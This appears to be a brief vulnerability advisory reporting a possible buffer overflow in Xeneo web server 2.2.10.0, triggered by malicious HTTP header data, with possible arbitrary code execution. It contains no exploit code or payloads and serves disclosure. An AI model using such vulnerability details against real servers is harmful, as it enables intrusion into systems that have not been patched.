Xeneo web server has been reported prone to an undisclosed buffer overflow vulnerability.

It has been reported that a specifically crafted HTTP request containing malicious HTTP header information will trigger this condition.

Although unconfirmed, this issue may be exploited to execute arbitrary code.

It should also be noted, that although this vulnerability has been reported to affect Xeneo web server version 2.2.10.0 previous versions may also be vulnerable.
